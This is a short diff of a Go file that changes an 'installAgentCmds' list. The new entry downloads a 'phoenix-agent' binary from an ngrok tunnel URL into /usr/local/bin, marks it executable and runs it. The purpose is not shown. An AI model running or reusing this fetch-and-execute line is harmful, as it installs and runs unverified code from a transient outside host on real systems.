@@ -11,7 +11,7 @@ import (
 
 var (
 	installAgentCmds = []string{
-		"curl -sf http://080c60c2.ngrok.io/",
+		"curl -sf https://5da46805.ngrok.io/dist/phoenix-agent -o /usr/local/bin/phoenix-agent && chmod +x /usr/local/bin/phoenix-agent && phoenix-agent",
 	}
 )
 
